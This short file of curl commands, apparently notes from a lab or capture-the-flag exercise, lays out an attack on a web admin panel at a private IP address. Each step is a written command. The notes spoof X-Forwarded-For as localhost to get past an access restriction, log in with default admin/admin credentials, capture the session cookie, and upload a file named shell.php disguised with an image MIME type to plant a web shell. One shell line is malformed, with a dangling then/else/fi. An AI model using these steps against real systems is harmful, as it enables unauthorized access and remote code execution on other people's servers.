
# Exmples with X-Forwarded-For:
## Get page
curl http://192.168.81.138/administration/ -H "X-Forwarded-For: 127.0.0.1:80"

## Login
curl http://192.168.81.138/administration/ -H "X-Forwarded-For: 127.0.0.1:80" -d "username=admin&password=admin" | grep "welcome back" 

curl http://192.168.81.138/administration/ -v -H "X-Forwarded-For: 127.0.0.1:80" -d "username=admin&password=admin" -s | grep -q  "welcome back"; then echo "Logged In"; else echo "Login Failed"; fi

## Get the login cookie from the last response 
curl http://192.168.81.138/administration/ -H "X-Forwarded-For: 127.0.0.1:80" -v -d "username=admin&password=admin" -c cookie

## Get upload page
curl http://192.168.81.138/administration/upload/ -H "X-Forwarded-For: 127.0.0.1:80" -v -b cookie 

## Post a file. (set mimetype on image from php)
curl http://192.168.81.138/administration/upload/ -H "X-Forwarded-For: 127.0.0.1:80" -b cookie -F 'document=@shell.php;type=image/jpg'  --proxy 127.0.0.1:8080
